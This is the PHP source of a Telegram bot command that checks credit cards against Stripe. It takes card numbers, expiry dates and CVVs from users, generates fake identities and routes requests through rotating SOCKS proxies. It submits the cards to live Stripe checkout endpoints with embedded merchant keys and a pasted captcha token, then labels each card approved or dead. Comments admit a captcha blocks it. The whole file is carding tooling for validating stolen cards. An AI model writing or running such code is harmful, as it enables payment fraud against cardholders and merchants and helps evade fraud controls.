<?php
//===================================//
// NO FUNCIONA POR CATPCHA
//===================================//
/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/

error_reporting(0);
ini_set('display_errors', 0);
include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
        

            ###CHECKER PART###  
            // $zip = rand(10001,90045);
            $time = rand(30000,699999);
            // $rand = rand(0,99999);
            // $pass = rand(0000000000,9999999999);
            // $email = substr(md5(mt_rand()), 0, 7);
            // $name = substr(md5(mt_rand()), 0, 7);
            // $last = substr(md5(mt_rand()), 0, 7);

            ///////////////////////////////////////////////////=========[PROXY]

            function rebootproxys()
            {
                $poxySocks = file("proxy.txt");
                $myproxy = rand(0, sizeof($poxySocks) - 1);
                $poxySocks = $poxySocks[$myproxy];
                return $poxySocks;
            }
            $poxySocks4 = rebootproxys();

            $username = 'LYHBl6a1ssT'; 
            $password = 'zc7l6f4Tn'; 
            // $socks = array_rand($ip);
            // $proxy = $ip[$socks];
            
            $proxiss = explode(":", $poxySocks4);        

            ///////////////////////////////////////////////////=========[Authorizing Cards]
        
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
            curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
            curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: m.stripe.com',
            'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Accept: */*',
            'Accept-Language: en-US,en;q=0.5',
            'Content-Type: text/plain;charset=UTF-8',
            'Origin: https://m.stripe.network',
            'Referer: https://m.stripe.network/inner.html'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "");

            $res = curl_exec($ch);
            $muid = trim(strip_tags(capture($res,'"muid":"','"')));
            $sid = trim(strip_tags(capture($res,'"sid":"','"')));
            $guid = trim(strip_tags(capture($res,'"guid":"','"')));

            echo "\n\nmuid>".$muid;
            echo "\nsid>".$sid;
            echo "\nguid>".$guid;
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");
            
            //===========================================================================//
            //=============================FAKE USER GENERATOR=============================//
        $get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $first = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        $state1 = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $zip = $matches1[1][0];
        preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
        $usrnme = $matches1[1][0];
        preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
        $pass = $matches1[1][0];
        preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
        $salt = $matches1[1][0];
        $pwd = ''.$pass.''.$salt.'';
        preg_match_all("(\"nat\":\"(.*)\")siU", $get, $matches1);
        $con = $matches1[1][0];
        $numero1 = substr($phone, 1,3);
        $numero2 = substr($phone, 6,3);
        $numero3 = substr($phone, 10,4);
        $phone = $numero1.''.$numero2.''.$numero3;
        $serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
        $serv_rnd = $serve_arr[array_rand($serve_arr)];
        $email = str_replace("example.com", $serv_rnd, $email);
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
            	$schemename = "Unavailable";
            }
            if (empty($typename)) {
            	$typename = "Unavailable";
            }
            if (empty($brand)) {
            	$brand = "Unavailable";
            }
            if (empty($bank)) {
            	$bank = "Unavailable";
            }
            if (empty($cname)) {
            	$cname = "Unavailable";
            }
            if (empty($phone)) {
            	$phone = "Unavailable";
            }
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
            curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
              'Host: api.stripe.com',
              'path: /v1/payment_methods',
              'Accept: application/json',
              'Accept-Language: en-US,en;q=0.9',
              'Content-Type: application/x-www-form-urlencoded',
              'Origin: https://checkout.stripe.com',
              'Referer: https://checkout.stripe.com/',
              'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            //ESTE ES EL DE ATLAS VPN
            // curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&billing_details[address][postal_code]=$zip&guid=$guid&muid=$muid&sid=$sid&payment_user_agent=stripe.js%2F185ad2604%3B+stripe-js-v3%2F185ad2604&time_on_page=$time&referrer=https%3A%2F%2Fatlasvpn.com%2F&key=pk_live_woOdxnyIs6qil8ZjnAAzEcyp00kUbImaXf");
            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&billing_details[name]=Alberto+Solano&billing_details[email]=granrobodeauto%40gmail.com&billing_details[address][country]=HN&key=pk_live_51JGEXhHyqa9tsmWFWCjd4IPq1L9WSd04TT4pQIsvnoH71VAkHDtIg4d4YwsM37OTaU0gnjTWDKgVTcmnGEN9UJVz0076bjqMy5&payment_user_agent=stripe.js%2F185ad2604%3B+stripe-js-v3%2F185ad2604%3B+checkout");
            $result1 = curl_exec($ch);
            

            if(stripos($result1, 'error')){
              $errormessage = trim(strip_tags(capture($result1,'"message": "','"')));
              $stripeerror = True;
            }else{
              $id = trim(strip_tags(capture($result1,'"id": "','"')));
              $stripeerror = False;
            }
            echo "\nid>".$id;
            if(!$stripeerror){
              //ESTE NO FUNCIONA DE IGUALMANERA PORQUE USA CAPTCHA
                // $ch = curl_init();
                // curl_setopt($ch, CURLOPT_URL, 'https://user.atlasvpn.com/v1/stripe/pay');
                // curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                // curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
                // curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
                // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
                // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                // curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                // curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                // curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                // curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                //   'Accept: application/json, text/plain, */*',
                //   'accept-language: es-ES,es-419;q=0.9,es;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
                //   'accept-encoding: gzip, deflate, br',
                //   'content-type: application/json;charset=UTF-8',
                //   'Host: user.atlasvpn.com',
                //   'sec-fetch-dest: empty',
                //   'sec-fetch-mode: cors',
                //   'sec-fetch-site: same-site',
                //   'Origin: https://atlasvpn.com',
                //   'Referer: https://atlasvpn.com/',
                //   'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
                // curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
                // curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
                
                // curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$email.'","name":"'.$first.' '.$last.'","payment_method_id":"'.$id.'","identifier":"com.atlasvpn.vpn.subscription.p3y.stripe_regular_5","currency":"USD","postal_code":"'.$zip.'"}');
                // curl_setopt($ch, CURLOPT_POSTFIELDS,'{"utm_campaign":"user_zone","utm_term":"hero","email":"'.$email.'","name":"'.$first.' '.$last.'","payment_method_id":"'.$id.'","identifier":"com.atlasvpn.vpn.subscription.p3y.stripe_regular_5","currency":"USD","postal_code":"'.$zip.'","token":"03AEkXODAQcLD3_zKV332obJHXYIxMiY_wGmsDWrpfc8WEHMRQZC9nYSWDmrMfIPm7aM0iXzz1Yxk53l9COd_J1Gq0al9hjVAXGqvtj0K2tKZ6U_Lcf3VhJS0X1pUrcrpBUnh6JDkjwJSuFIQISVexYwcS2JwUOXAJKHLbEKCG5Hr7vI3zt1IzFYiUX5Cb2Bck1ytTdLDXh3rnOliXBtfaQ8Hm0sdn8mheNsrGI860ZTILEj8-OzvN1zrlg_cwaSKrcrjUIth-aTq5cgaBT866c6OwY7TKYK60s1j0kwRQQk4GT0n8CEtrtMhwPNrrSXFpNlm8Kp-bQ1OYDb2B6K4dgjvPKLyE_RxQB1XQC75BruBXz2CTsQfjvQZsM22gmIupc2_WoLRRQpHJvN7QowTeOyOFO8BR1j1HzXNtITTcBHmNYN_LPkMRCTabYvIkAsU_39BrDEvpOIZ8mQ85LD16umW-h4lvXwxf1YXbHnu1FHAFQYFE3I1YAqFnYMKjz90bLSlZvr2juQlK"}');
                
                // $result2 = curl_exec($ch);
                // $errormessage = trim(strip_tags(capture($result2,'"code":"','"')));

                //==========test2=========//
                $ch = curl_init();
              curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/cs_live_a1Q6yTKoPKcwbcgw4maMt07jaCDBoTdz81bKqdT6IZ2j9S5Yk9kcRUbHu1/confirm');
              curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
              curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
              curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
              curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
              curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
              curl_setopt($ch, CURLOPT_HEADER, 0);
              curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: api.stripe.com',
                'method: POST',
                'path: /v1/payment_pages/cs_live_a1Q6yTKoPKcwbcgw4maMt07jaCDBoTdz81bKqdT6IZ2j9S5Yk9kcRUbHu1/confirm',
                'scheme: https',
                'accept: application/json',
                'accept-encoding: gzip, deflate, br',
                'accept-language: es-ES,es;q=0.7',
                'content-type: application/x-www-form-urlencoded',
                'origin: https://checkout.stripe.com',
                'referer: https://checkout.stripe.com/',
                'sec-fetch-dest: empty',
                'sec-fetch-mode: cors',
                'sec-fetch-site: same-site',
                'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
              curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
              curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
              curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
              curl_setopt($ch, CURLOPT_POSTFIELDS, "eid=NA&payment_method=$id&expected_amount=299&last_displayed_line_item_group_details[subtotal]=299&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=pk_live_51JGEXhHyqa9tsmWFWCjd4IPq1L9WSd04TT4pQIsvnoH71VAkHDtIg4d4YwsM37OTaU0gnjTWDKgVTcmnGEN9UJVz0076bjqMy5");
              $result2 = curl_exec($ch);
              $obt=json_decode($result2,true);
              $paymetintent=$obt['payment_intent']['id'];
              $clientS=$obt['payment_intent']['client_secret'];
              $path=$obt['payment_intent']['next_action']['use_stripe_sdk']['stripe_js']['verification_url'];

              echo "\nINTENT>".$paymetintent;
              echo "\nclientSecret>".$clientS;
              

              $ch = curl_init();
              $urls='https://api.stripe.com/'.$path;
              curl_setopt($ch, CURLOPT_URL, $urls);
              curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
              curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
              curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
              curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
              curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
              curl_setopt($ch, CURLOPT_HEADER, 0);
              curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: api.stripe.com',
                'method: POST',
                'path: '.$path,
                'scheme: https',
                'accept: application/json',
                'accept-encoding: gzip, deflate, br',
                'accept-language: es-ES,es;q=0.7',
                'content-type: application/x-www-form-urlencoded',
                'origin: https://js.stripe.com',
                'referer: https://js.stripe.com/',
                'sec-fetch-dest: empty',
                'sec-fetch-mode: cors',
                'sec-fetch-site: same-site',
                'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
              curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
              curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
              curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
              curl_setopt($ch, CURLOPT_POSTFIELDS, "challenge_response_token=P0_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoieUI2TnpDQnBpUStaQ1g2bVV2RkNXQk5jejNTRVlQcSt6dUZjbHRUbS9NTUJRZ3I5eVV0VzlYZkJBYjFkYWJSUVhDenE0NlBYbEwyMHMrUEhqTXpoM3hMTXFDcnh3Ujl4Rk1HeDk4bUZKNXVVMDRQRUdycm0wNXR6bTFjZU1jaGlMZGhwNEZraXZuaWhtSnlCMEU5Z2ZvcTBlcXdvOWVQVEllNzRuaGVJYVFmQmtFb2s1N2VDM1RtT3hBMDM4SW5YSkFuUnBjQVBpUTIydE0wcDkyRjNYSlo3R0g1UWNJNkNxSzR6TnBDbU1tRDl1MnYvbGN2V3JIamJVT0o0RzFWMDdMdjlGWUNzMUxqWVhSZjJtMCt6eW5ZdTgwekVlclZWZjQwUHBRUjF0dCs5aUZXblROYStDN2diRWtvT0Qwd2xCZnhyQUFYSWhIUVF3bitsT2U4RkhMVWtORWNJTFVlSHY5L3cwdFlPcW50d2ZuZExtUWdrbXV0ZW1QbFNaSDBvRW1HeHVHUVNJRmRxN1E0T2dSbGh2cUZNN2dxeGVnaDc2S3ZxbmZWcm1hS1dzcmljaWJjU3c1d3I5QzBXMk80TDdtTWo3aXJhcllvL3ljSDBGMGNuU29RblIvZDBlbmVXTjBXeXpKZFRiKzNIMFNYZFpPamhxM0E3REtLaitqOFd1TkRsWDEzZGdVU2kwUGhnSEgwaDl4d3dMZXVaVlgyV0IxRFQya01tZWtXZEs3QUpveE81TlAyeDVKd2xCajAxMVZUZDEybjEvYmNET1l3S2YvM1FERDhHN2M4bENSQVk2NFVvT0h3MGJpTjUycGl5TkUzdmFOS2ZDTnZ6RVFHK2F0V0loY3NNTXlITWs1SEdEMnpoQ2EvcTNGdThXYkphSS9Ucjl4dXBsRlJDRFRKK25QSE1zVGJRcXRWK1dVRFZkbXRYdFVzcEpHa3Jzd0IyaEllNUNWUlhrODd3dFJqckNXbXE1c2dZeEh5WjNaQWJxV08zbG1maHFSYVR2OWpxdjFVakt2bXEzOGtJaFZsc216cUVpT0dGVnhEMG00NnRCV2FYTU5NTVdPT1RxNWlFQnB1UlZIT2FxS1BpdyswbXNRU3J3VXBacWt1LzhGVnFrcWdrK1VFQ0xFL2JFVHlRV0NVUWtwdDkwTk11WHkzalovZStlZGE2b0RncTFHT3krck9mUzZvUE05TWtabUlnTGxqaE9TV05WS1hWR09ZbmtXODRIYmljR3lnQmZWNTl2Q1c0QjJ5MEJKbFkxM0lOL0ozWnoydTV6bEpWYUlISEh1ZVRjRHNlNWE5d1pybkd5YXgrTjRvOUwvUTRvMk9RZzZ3OSt6SnR3SW1aS21vcEhQRGIydGJzcTVyMEFOMk8rZzNCZUcrbnpxbEhGNkxvaHZ1cTNnNkhOeStsREgwMk1jOHgwVmVOSEduRWg4aXEvU1lFTG5oMmM3eDBtaVhYZ3ZHc29LYkwvNFo1eDFmdmNWVlJXeUZlcDJaWTZYVHphSGdvN3A3dHZiWEpXZDRRNXl3K0ZDYWlRVHpDOWdYZEIrRGVvcnkyaE1rOUZldEdNREN3dXo5ZjI0MFRPeXhpdWR6NkRMSTh1S1RTRGt4Z2dRMkZHL2RWR0lBWFg2OU5TVzdQWjFnNlVWUGRvTk1TOCtobitrWGxoNTRReXpFdzNvQnlyODJSTTF4OXJnNXk0NENlVk45M0kwTWVSZXlONCsxcTRHelU4aUtaQVphVnRnS3lUY080cWR6VERVNWtQR3BZM0JEY3F6azNtZ3hQMVh4QW5OMmdYazc1VEh3ek9vU2Ivby9xQTk0aUM1eWo0WTBVYjdka0RqWlRwWGh2MzRKcEl6KytoNE1YS2htMjBWSmt3OEhOY1pSQkVGeXVyRHpQcmF5aUcxWWJtTCtqT2NXM0xHUnhmOWN2Ui9zc09CZlBuaWV4OXFGZmtWbk5vTm1WY2srZnU5NUJmTnN0anRBc3ZRQ2V0d05JV0pJOFlIT2IraFhzSGdqUHdTbkI2RlE4MDBXWFNuST1MTzNVVUJXNE14aW5JSERxIiwiZXhwIjoxNjY5MzM2MDM3LCJzaGFyZF9pZCI6ODMzNDQwODk3LCJwZCI6MH0.kDvIfsSQHGepCAX4TxDcYlzyZ-givfI9oySB4WeVMyA&challenge_response_ekey=&client_secret=$clientS&key=pk_live_51JGEXhHyqa9tsmWFWCjd4IPq1L9WSd04TT4pQIsvnoH71VAkHDtIg4d4YwsM37OTaU0gnjTWDKgVTcmnGEN9UJVz0076bjqMy5");
              $result3 = curl_exec($ch);
                //==========================================//
            }
            $info = curl_getinfo($ch);
            $ob=json_decode($result3,true);
            $rror=$ob['last_payment_error']['message'];
            $time = $info['total_time'];
            $time = substr_replace($time, '',4);

            echo "\n".$result3;
            bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"<b>Card:</b> <code>$lista</code>
Response -» 😭 $rror
Gateway -» Stripe Auth 1
Time -» <b>$time</b><b>s</b>
<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true']);
            //========================NO COMPLETADO POR UN CAPTCHA QUE MOLESTA ALLI======//
            ###END OF CHECKER PART###
            
            
//             if(strpos($result2, 'client_secret')) {
//               addTotal();
//               addUserTotal($userId);
//               addCVV();
//               addUserCVV($userId);
//               addCCN();
//               addUserCCN($userId);
//               bot('editMessageText',[
//                 'chat_id'=>$chat_id,
//                 'message_id'=>$messageidtoedit,
//                 'text'=>"<b>Card:</b> <code>$lista</code>
// <b>Status -» CVV or CCN ✅
// Response -» Approved
// Gateway -» Stripe Auth 1
// Time -» <b>$time</b><b>s</b>

// ------- Bin Info -------</b>
// <b>Bank -»</b> $bank
// <b>Brand -»</b> $schemename
// <b>Type -»</b> $typename
// <b>Currency -»</b> $currency
// <b>Country -»</b> $cname ($emoji - 💲$currency)
// <b>Issuers Contact -»</b> $phone
// <b>----------------------------</b>

// <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
// <b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
//                 'parse_mode'=>'html',
//                 'disable_web_page_preview'=>'true'
                
//             ]);}
//             elseif($result2 == null && !$stripeerror) {
//               addTotal();
//               addUserTotal($userId);
//               bot('editMessageText',[
//                 'chat_id'=>$chat_id,
//                 'message_id'=>$messageidtoedit,
//                 'text'=>"<b>Card:</b> <code>$lista</code>
// <b>Status -» API Down ❌
// Response -» Unknown
// Gateway -» Stripe Auth 1
// Time -» <b>$time</b><b>s</b>

// ------- Bin Info -------</b>
// <b>Bank -»</b> $bank
// <b>Brand -»</b> $schemename
// <b>Type -»</b> $typename
// <b>Currency -»</b> $currency
// <b>Country -»</b> $cname ($emoji - 💲$currency)
// <b>Issuers Contact -»</b> $phone
// <b>----------------------------</b>

// <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
// <b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
//                 'parse_mode'=>'html',
//                 'disable_web_page_preview'=>'true'
                
//             ]);}
//             else{
//               addTotal();
//               addUserTotal($userId);
//               bot('editMessageText',[
//                 'chat_id'=>$chat_id,
//                 'message_id'=>$messageidtoedit,
//                 'text'=>"<b>Card:</b> <code>$lista</code>
// <b>Status -» Dead ❌
// Response -» $errormessage
// Gateway -» Stripe Auth 1
// Time -» <b>$time</b><b>s</b>

// ------- Bin Info -------</b>
// <b>Bank -»</b> $bank
// <b>Brand -»</b> $schemename
// <b>Type -»</b> $typename
// <b>Currency -»</b> $currency
// <b>Country -»</b> $cname ($emoji - 💲$currency)
// <b>Issuers Contact -»</b> $phone
// <b>----------------------------</b>

// <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
// <b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
//                 'parse_mode'=>'html',
//                 'disable_web_page_preview'=>'true'
                
//             ]);}
          
        }else{
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              
          ]);
      }
    }
}


?>